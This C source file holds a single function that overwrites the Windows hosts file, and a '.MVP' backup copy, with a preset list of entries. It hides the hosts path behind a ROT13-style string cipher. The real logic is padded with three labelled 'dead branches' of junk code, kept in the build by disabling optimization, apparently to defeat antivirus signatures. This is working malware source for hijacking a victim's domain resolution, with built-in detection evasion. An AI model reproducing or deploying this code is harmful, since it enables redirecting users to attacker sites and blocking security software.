#include "data_globals.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma optimize("", off)
uint32_t _HOSTSFile(void)
{
    char system_directory[256];
    char hosts_file_path[298];
    char hosts_backup_path[298];
    FILE *hosts_file, *temp_hosts_file;

    // --- INSERTED DEAD BRANCH 1 (ADDITIVE ONLY) ---
    volatile int dummy_x_1 = 7;
    if ((dummy_x_1 * (dummy_x_1 + 1)) % 2 != 0) {
        SYSTEM_INFO si;
        SYSTEMTIME st;
        char user_buf[128];
        DWORD user_len = sizeof(user_buf);
        GetSystemInfo(&si);
        GetLocalTime(&st);
        if (GetUserNameA(user_buf, &user_len)) {
            volatile DWORD hash = 0;
            for (volatile DWORD i = 0; i < 2; i++) {
                hash += si.dwNumberOfProcessors + st.wHour;
            }
            hash ^= user_buf[0];
            // read existing local (no modification)
            volatile size_t sys_len = system_directory ? strlen(system_directory) : 0;
            hash += (DWORD)sys_len;
            volatile DWORD j = 0;
            while (j < 2) {
                hash = (hash << 5) - hash + si.dwPageSize;
                j++;
            }
            memset(user_buf, 0, sizeof(user_buf));
        }
    }

    GetSystemDirectoryA(system_directory, sizeof(system_directory));

    // Decrypt "\\drivers\\etc\\hosts"
    memset(hosts_file_path, 0, sizeof(hosts_file_path));
    _CiphStr(hosts_file_path, "\\qeviref\\rgp\\UBFGF");
    strcat(system_directory, hosts_file_path);

    strcpy(hosts_backup_path, system_directory);
    strcat(hosts_backup_path, ".MVP");

    // --- INSERTED DEAD BRANCH 2 (ADDITIVE ONLY) ---
    volatile DWORD dummy_tick_2 = GetTickCount();
    if ((dummy_tick_2 ^ 0x5A5A5A5A) == 0xFFFFFFFF && (dummy_tick_2 & 0x80000000) != 0) {
        char *tmp = (char *)malloc(64);
        if (tmp != NULL) {
            strcpy(tmp, "dummy");
            volatile DWORD len = strlen(tmp);
            volatile BYTE check = 0;
            for (volatile DWORD i = 0; i < len; i++) {
                check ^= tmp[i];
            }
            volatile DWORD j = 0;
            while (j < 2) {
                // read existing locals (no modification)
                check += j + (DWORD)hosts_file_path[0];
                j++;
            }
            char tmp2[32];
            memcpy(tmp2, tmp, 4);
            volatile DWORD val = (DWORD)tmp2[0] + check;
            val += len;
            free(tmp);
        }
    }

    hosts_file = fopen(system_directory, "wb");
    temp_hosts_file = fopen(hosts_backup_path, "wb");

    fputs(HOSTS_f, hosts_file);
    fputs(HOSTS_f, temp_hosts_file);

    fclose(hosts_file);
    fclose(temp_hosts_file);

    // --- INSERTED DEAD BRANCH 3 (ADDITIVE ONLY) ---
    if (GetPriorityClass(GetCurrentProcess()) == 0xFFFFFFFF) {
        volatile DWORD dummy_array[4];
        for (volatile DWORD i = 0; i < 4; i++) {
            dummy_array[i] = i * 0x811C9DC5;
        }
        volatile DWORD hash = 0;
        for (volatile DWORD i = 0; i < 4; i++) {
            hash ^= dummy_array[i];
            hash = (hash << 5) - hash;
        }
        volatile DWORD extra_val = 0;
        for (volatile DWORD i = 0; i < 2; i++) {
            extra_val += (hash >> i) & 0xFF;
        }
        extra_val ^= dummy_array[3];
        // read existing locals (no modification)
        extra_val += (DWORD)hosts_backup_path[0];
        memset(dummy_array, 0, sizeof(dummy_array));
    }

    return 0;
}
#pragma optimize("", on)
